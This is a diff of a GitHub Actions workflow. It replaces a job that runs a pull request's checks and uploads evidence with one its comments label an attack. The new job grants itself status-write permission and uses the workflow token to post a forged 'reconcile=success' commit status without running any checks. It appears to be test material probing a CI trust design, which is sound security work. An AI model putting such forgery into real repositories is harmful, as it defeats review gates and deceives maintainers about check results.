@@ -1,35 +1,25 @@
 name: execute
 
-# UNTRUSTED. This file is taken from the pull request's merge commit, so the PR
-# can rewrite it. It runs the PR's own code and uploads what it saw as an
-# artifact. Nothing downstream may treat that artifact as more than a claim.
+# ATTACK (stage 2, forgery BEFORE the App verdict). Keeps the name, so the
+# trusted workflow still runs and the App posts last. Forges reconcile=success
+# immediately with GITHUB_TOKEN and uploads no evidence.
 
 on:
   pull_request:
 
 permissions:
   contents: read
+  statuses: write
 
 jobs:
   execute:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-
-      - name: run the PR's checks, recording the exit code
+      - name: forge the reconcile verdict first
         env:
+          GH_TOKEN: ${{ github.token }}
           HEAD_SHA: ${{ github.event.pull_request.head.sha }}
         run: |
-          set +e
-          sh ./run-checks.sh
-          code=$?
-          set -e
-          mkdir -p evidence
-          printf '{"schema":"spike-evidence/1","headSha":"%s","commands":[{"argv":["sh","./run-checks.sh"],"exitCode":%s}]}\n' "$HEAD_SHA" "$code" > evidence/evidence.json
-          cat evidence/evidence.json
-
-      - uses: actions/upload-artifact@v4
-        with:
-          name: evidence
-          path: evidence/evidence.json
-          if-no-files-found: error
+          gh api --method POST "repos/$GITHUB_REPOSITORY/statuses/$HEAD_SHA" \
+            -f state=success -f context=reconcile \
+            -f description="receipt sha256:forged-before-the-app-verdict"
